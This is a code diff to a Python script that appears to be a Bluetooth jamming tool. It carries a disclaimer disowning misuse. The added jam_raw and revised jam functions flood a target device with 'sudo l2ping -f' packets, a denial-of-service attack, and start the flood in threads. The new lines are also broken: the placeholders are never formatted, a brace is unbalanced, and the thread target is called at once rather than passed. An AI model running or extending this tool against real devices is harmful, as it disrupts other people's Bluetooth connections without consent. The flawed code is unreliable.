@@ -14,7 +14,13 @@ print("Author: Logan Goins\n")
 print("I am not responsible for any damages or misuse from this software.\nThis software is used at your own risk\n")
 
 
+def jam_raw():
+    subprocess.check_output("sudo l2ping -i {interface} -s {packetsize} -f {target}}".split(" "))
+
+
+
 def scan():
+
     try:
         
         print("Scanning for devices...")
@@ -69,7 +75,7 @@ def passive_scan():
 
         os.system("clear")
 
-        theads = []
+        threads = []
 
 
         while True:       
@@ -100,6 +106,9 @@ def passive_scan():
 
 
 def jam():
+
+    threads = []
+
     if interface == " ":
         print("Bluetooth Interface not set")
         main()
@@ -111,8 +120,9 @@ def jam():
         main()
 
     print("Starting packet flow")
-    os.system("sudo l2ping -i " + interface + " -s " + packetsize + " -f " + target)  # Does this need to be silenced?
-
+    subprocess.check_output("sudo l2ping -i {interface} -s {packetsize} -f {target}}".split(" "))
+    threads.append(Thread(target=jam_raw()))               
+    threads[-1].start()
 
 def help_menu():
     print(" \n")
